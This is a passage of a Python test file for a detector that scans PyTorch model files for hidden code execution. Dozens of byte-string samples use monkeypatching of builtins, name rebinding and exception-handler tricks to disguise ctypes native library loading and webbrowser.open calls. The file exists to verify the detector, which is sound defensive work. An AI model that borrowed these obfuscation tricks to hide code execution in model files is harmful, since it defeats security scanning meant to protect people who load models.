                b"except RuntimeError:\n    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"for _ in [0, 1]:\n    if True:\n        continue\n    c.CDLL = print\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"0 == 1 == (wb.__dict__.update(open=print) is None)\nopener = wb.open\n"
                b"opener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nlist(c.__dict__.update(CDLL=original) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"list = lambda iterable: None\nlist(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b'import webbrowser as wb\n"""\nfrom __future__ import annotations\n"""\n',
                b"original = wb.open\nwb.open = print\ndef noop(arg: wb.__dict__.update(open=original)):\n"
                b"    pass\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nif c.__dict__.update(CDLL=original) is None:\n"
                b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nfor _ in [c.__dict__.update(CDLL=original)]:\n"
                b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"original = c.CDLL\nc.CDLL = print\nbuiltins.list(c.__dict__.update(CDLL=original) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"consume = list\noriginal = c.CDLL\nc.CDLL = print\n"
                b"consume(c.__dict__.update(CDLL=original) for _ in [0])\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nfrom builtins import list as consume\n",
                b"original = c.CDLL\nc.CDLL = print\nconsume(c.__dict__.update(CDLL=original) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"builtins.list = lambda iterable: None\nlist(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"builtins.__dict__['list'] = lambda iterable: None\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"builtins.__dict__.update(list=lambda iterable: None)\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"setattr(builtins, 'list', lambda iterable: None)\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\n",
                b"original = c.CDLL\nc.CDLL = print\nb.list(c.__dict__.update(CDLL=original) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nRuntimeError = ValueError\ntry:\n    raise RuntimeError()\n"
                b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nValueError = RuntimeError\ntry:\n    raise RuntimeError()\n"
                b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\ntry:\n"
                b"    raise RuntimeError(c.__dict__.update(CDLL=original))\nexcept RuntimeError:\n"
                b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport contextlib\n",
                b"original = c.CDLL\nc.CDLL = print\n"
                b"with (c.__dict__.update(CDLL=original) or contextlib.nullcontext()):\n"
                b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nmatch c.__dict__.update(CDLL=original):\n"
                b"    case _:\n        pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport contextlib\n",
                b"original = c.CDLL\nc.CDLL = print\nwith contextlib.nullcontext(original) as c.CDLL:\n"
                b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport contextlib\n",
                b"original = c.CDLL\nc.CDLL = print\nreal = contextlib.nullcontext\n"
                b"contextlib.nullcontext = lambda ignored: real(original)\n"
                b"with contextlib.nullcontext(print) as c.CDLL:\n"
                b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nfor c.CDLL in [original]:\n"
                b"    pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nmatch 0:\n"
                b"    case 0 if c.__dict__.update(CDLL=original) is None:\n"
                b"        pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nsubject = 0\nmatch subject:\n"
                b"    case _ if c.__dict__.update(CDLL=original) is None:\n"
                b"        pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nsubject = 0\nmatch subject:\n"
                b"    case _ if False:\n        pass\n"
                b"    case _ if c.__dict__.update(CDLL=original) is None:\n"
                b"        pass\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"original = c.CDLL\nc.CDLL = print\nbuiltins.ValueError = RuntimeError\ntry:\n"
                b"    raise RuntimeError()\nexcept ValueError:\n    c.CDLL = original\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nValueError = TypeError\n"
                b"for ValueError in [RuntimeError]:\n    pass\ntry:\n    raise RuntimeError()\n"
                b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport contextlib\n",
                b"original = c.CDLL\nc.CDLL = print\n"
                b"with contextlib.nullcontext(RuntimeError) as ValueError:\n    pass\n"
                b"try:\n    raise RuntimeError()\nexcept ValueError:\n    c.CDLL = original\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nValueError = TypeError\n"
                b"if globals().get('enabled'):\n    ValueError = RuntimeError\ntry:\n    raise RuntimeError()\n"
                b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"dict.update(builtins.__dict__, list=lambda iterable: None)\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"dict.__setitem__(builtins.__dict__, 'list', lambda iterable: None)\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"namespace = builtins.__dict__\nnamespace |= {'list': lambda iterable: None}\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"for list in [lambda iterable: None]:\n    pass\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport contextlib\n",
                b"with contextlib.nullcontext(lambda iterable: None) as list:\n    pass\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"match (lambda iterable: None):\n    case list:\n        pass\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\n",
                b"b.setattr(b, 'list', lambda iterable: None)\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"original_list = builtins.list\nbuiltins.list = lambda iterable: None\n"
                b"globals()['original_list'] = lambda iterable: None\nbuiltins.list = original_list\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"original = c.CDLL\nc.CDLL = print\nnamespace = builtins.__dict__\n"
                b"namespace |= {'ValueError': RuntimeError}\ntry:\n    raise RuntimeError()\n"
                b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nfor b.setattr in [lambda *args: None]:\n    pass\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nfor b.list in [lambda iterable: None]:\n    pass\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nnamespace = b.vars(b)\n"
                b"for namespace['list'] in [lambda iterable: None]:\n    pass\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nimport contextlib\n"
                b"with contextlib.nullcontext(lambda *args: None) as b.setattr:\n    pass\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nb.setattr(b, 'setattr', lambda *args: None)\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nb.setattr(b, 'vars', lambda obj: {})\n"
                b"b.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nreal_vars = b.vars\nb.vars = lambda obj: {}\n"
                b"real_vars(b).update({'setattr': lambda *args: None})\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nreal_setattr = b.setattr\nb.setattr = lambda *args: None\n"
                b"real_setattr(b, 'vars', lambda obj: {})\n"
                b"b.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\nreal_vars = b.vars\nb.vars = lambda obj: {}\n",
                b"real_vars(b).update({'setattr': lambda *args: None})\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\nreal_setattr = b.setattr\nb.setattr = lambda *args: None\n",
                b"real_setattr(b, 'vars', lambda obj: {})\n"
                b"b.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\nreal_vars = b.vars\nb.vars = lambda obj: {}\n"
                b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n",
                b"real_vars(b).update({'setattr': lambda *args: None})\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\nreal_setattr = b.setattr\n"
                b"b.setattr = lambda *args: None\nif globals().get('enabled'):\n"
                b"    real_setattr = lambda *args: None\n",
                b"real_setattr(b, 'vars', lambda obj: {})\n"
                b"b.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\nreal_vars = b.vars\nb.vars = lambda obj: {}\n"
                b"enabled = True\nif globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
                b"b.vars = real_vars\n",
                b"b.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\nreal_setattr = b.setattr\n"
                b"b.setattr = lambda *args: None\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_setattr = lambda *args: None\n"
                b"b.setattr = real_setattr\n",
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nreal_vars = b.vars\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
                b"real_vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\nreal_vars = b.vars\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n",
                b"real_vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nreal_setattr = b.setattr\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_setattr = lambda *args: None\n"
                b"real_setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\nreal_setattr = b.setattr\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_setattr = lambda *args: None\n",
                b"real_setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nreal_setattr = b.setattr\nreal_vars = b.vars\n"
                b"b.vars = lambda obj: {}\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_setattr = lambda *args: None\n"
                b"real_setattr(b, 'vars', real_vars)\n"
                b"b.vars(c).update(CDLL=print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\nreal_setattr = b.setattr\n"
                b"b.setattr = lambda *args: None\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_setattr = lambda *args: None\n",
                b"real_setattr(b, 'setattr', real_setattr)\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nns = b.vars(b)\nupdate = ns.update\n"
                b"update({'setattr': lambda *args: None})\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nns = b.vars(b)\nupdate = ns.update\n"
                b"update({'list': lambda iterable: None})\n"
                b"list(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nns = b.vars(b)\nsetitem = ns.__setitem__\n"
                b"setitem('setattr', lambda *args: None)\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nreal_vars = b.vars\nreal_setattr = b.setattr\n"
                b"b.setattr = lambda *args: None\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
                b"namespace = real_vars(b)\nput = namespace.__setitem__\n"
                b"put('setattr', real_setattr)\nb.setattr(c, 'CDLL', print)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nreal_vars = b.vars\nreal_setattr = b.setattr\n"
                b"b.setattr = lambda *args: None\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
                b"namespace = real_vars(b)\nput = namespace.__setitem__\nrelay = put\n"
                b"relay('setattr', real_setattr)\nb.setattr(c, 'CDLL', print)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\ndict.update(b.__dict__, {'setattr': lambda *args: None})\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nfor print in [original]:\n    pass\n"
                b"c.CDLL = print\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport contextlib\n",
                b"original = c.CDLL\nwith contextlib.nullcontext(original) as print:\n    pass\n"
                b"c.CDLL = print\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nmatch original:\n    case print:\n        pass\n"
                b"c.CDLL = print\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins\n",
                b"original = c.CDLL\nnamespace = builtins.__dict__\nnamespace['print'] = original\n"
                b"c.CDLL = print\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\n",
                b"b.setattr = lambda *args: None\nb.setattr(c, 'CDLL', print)\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\nimport builtins as b\n",
                b"namespace = b.__dict__\nnamespace |= {'setattr': lambda *args: None}\n"
                b"b.setattr(c, 'CDLL', print)\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"match (lambda iterable: None):\n    case _ if False:\n        pass\n"
                b"    case list:\n        pass\nlist(c.__dict__.update(CDLL=print) for _ in [0])\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nValueError = TypeError\nmatch RuntimeError:\n"
                b"    case ValueError:\n        pass\ntry:\n    raise RuntimeError()\n"
                b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"original = c.CDLL\nc.CDLL = print\nValueError = TypeError\n"
                b"for (ValueError,) in [(RuntimeError,)]:\n    pass\ntry:\n    raise RuntimeError()\n"
                b"except ValueError:\n    c.CDLL = original\nloader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nreal_setattr = b.setattr\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_setattr = lambda *args: None\n"
                b"real_setattr(b, 'ValueError', RuntimeError)\ntry:\n    raise RuntimeError()\n"
                b"except ValueError:\n    c.CDLL = print\nexcept RuntimeError:\n    pass\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import ctypes as c\n",
                b"import builtins as b\nreal_vars = b.vars\nenabled = True\n"
                b"if globals().get('enabled'):\n    real_vars = lambda obj: {}\n"
                b"namespace = real_vars(b)\nput = namespace.__setitem__\n"
                b"put('ValueError', RuntimeError)\ntry:\n    raise RuntimeError()\n"
                b"except ValueError:\n    c.CDLL = print\nexcept RuntimeError:\n    pass\n"
                b"loader = c.CDLL\nloader('libpayload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\ntry:\n    raise RuntimeError()\nexcept RuntimeError:\n"
                b"    wb.open = original\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nfor _ in [0]:\n    continue\nelse:\n"
                b"    wb.open = original\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\ntry:\n    1 / 0\nexcept ZeroDivisionError:\n"
                b"    wb.open = original\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"try:\n    raise RuntimeError()\nexcept ValueError:\n    wb.open = print\n"
                b"except RuntimeError:\n    pass\nopener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nif condition:\n    wb = Holder\n"
                b"else:\n    wb.open = original\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nif condition:\n    wb.open = original\n"
                b"    opener = wb.open\nopener('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"",
                b"import builtins as bi\nimport webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
                b"(bi.list((opener := original) for _ in [0]), opener('https://example.invalid'))\n",
                "Web browser launch detected",
            ),
            (
                b"import builtins as bi\nimport webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\n"
                b"(bi.list((opener := original) for _ in [0]), opener('https://example.invalid'))\n",
                "Web browser launch detected",
            ),
            (
                b"import builtins\nimport webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nsetattr((bi := builtins), 'print', original)\n"
                b"wb.open = bi.print\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import builtins\nimport webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\ndel builtins.__dict__['print']\n"
                b"dict.setdefault(builtins.__dict__, 'print', original)\n"
                b"wb.open = builtins.print\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"",
                b"import builtins\nimport webbrowser as wb\noriginal = wb.open\nwb.open = print\n"
                b"((bi := builtins), bi.list((opener := original) for _ in [0]), "
                b"opener('https://example.invalid'))\n",
                "Web browser launch detected",
            ),
            (
                b"import builtins\nimport webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\nbuiltins.__dict__.pop('print')\n"
                b"dict.setdefault(builtins.__dict__, 'print', original)\n"
                b"wb.open = builtins.print\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import builtins\nimport webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\ndelattr(builtins, 'print')\n"
                b"dict.setdefault(builtins.__dict__, 'print', original)\n"
                b"wb.open = builtins.print\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import builtins\nimport webbrowser as wb\n",
                b"original = wb.open\nwb.open = print\ndelete = dict.__delitem__\n"
                b"delete(builtins.__dict__, 'print')\n"
                b"dict.setdefault(builtins.__dict__, 'print', original)\n"
                b"wb.open = builtins.print\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import builtins\nimport webbrowser as wb\n",
                b"original = wb.open\nif condition:\n    del builtins.__dict__['print']\n"
                b"dict.setdefault(builtins.__dict__, 'print', original)\n"
                b"wb.open = builtins.print\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import builtins\nimport webbrowser as wb\n",
                b"safe_print = print\noriginal = wb.open\nbuiltins.print = original\n"
                b"if condition:\n    del builtins.__dict__['print']\n"
                b"dict.setdefault(builtins.__dict__, 'print', safe_print)\n"
                b"wb.open = builtins.print\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import builtins\nimport webbrowser as wb\n",
                b"safe_print = print\noriginal = wb.open\nbuiltins.print = original\n"
                b"try:\n    setattr(builtins.__dict__, 'print', safe_print)\n"
                b"except AttributeError:\n    pass\nwb.open = builtins.print\n"
                b"wb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
        ],
    )
    def test_scan_model_preserves_dangerous_typed_member_captured_before_safe_overwrite(
        self, prefix: bytes, late_state: bytes, expected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = b"\x00\xff" + prefix + padding + late_state + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    def test_scan_model_detects_native_load_in_rebound_typed_member_self_write(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xffimport ctypes as c\nimport webbrowser as wb\n"
            + padding
            + b"wb = c.cdll\nwb.open = wb.open\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_detects_typed_member_restore_after_state_overflow(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        alternating_state = (b"wb.open = original\nwb.open = print\n" * 24) + b"wb.open = original\n"
        source = (
            b"\x00\xffimport webbrowser as wb\n"
            + padding
            + b"original = wb.open\n"
            + alternating_state
            + b"opener = wb.open\nopener('https://example.invalid')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_reuses_typed_member_state_signatures_for_late_captures(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        state = b"".join(
            f"wb.open = wb.open  # distinct state {index}\n".encode()
            for index in range(jit_script_module._MAX_PRIORITY_ASSIGNMENT_PROBES)
        )
        captures = b"".join(f"value_{index} = wb.open\n".encode() for index in range(1_000))
        source = (
            b"\x00\xffimport webbrowser as wb\n"
            + padding
            + state
            + captures
            + b"value_999('https://example.invalid')\n"
            + padding
        )
        normalized_state_bytes = 0
        real_sub = jit_script_module.re.sub

        def counting_sub(pattern: Any, replacement: Any, string: Any, *args: Any, **kwargs: Any) -> Any:
            nonlocal normalized_state_bytes
            if pattern == rb"\s+" and b"wb.open = wb.open" in string:
                normalized_state_bytes += len(string)
            return real_sub(pattern, replacement, string, *args, **kwargs)

        monkeypatch.setattr(jit_script_module.re, "sub", counting_sub)

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )
        assert normalized_state_bytes < len(state) * 20

    def test_scan_model_bounds_nonpriority_late_continuation_expansion(self, monkeypatch: pytest.MonkeyPatch) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        continuation = (b"x + \\\n" * 1_000) + b"0\n"
        source = (
            b"\x00\xffimport webbrowser as wb\n"
            + padding
            + continuation
            + b"opener = wb.open\nopener('https://example.invalid')\n"
            + padding
        )
        bounded_statement_calls = 0
        real_bounded_statement = jit_script_module._bounded_late_binding_statement

        def counting_bounded_statement(
            candidate: bytes, line_start: int, line_end: int
        ) -> tuple[bytes, tuple[int, int]]:
            nonlocal bounded_statement_calls
            bounded_statement_calls += 1
            return real_bounded_statement(candidate, line_start, line_end)

        monkeypatch.setattr(jit_script_module, "_bounded_late_binding_statement", counting_bounded_statement)

        findings = detector.scan_model(source, "pytorch", "payload.bin")

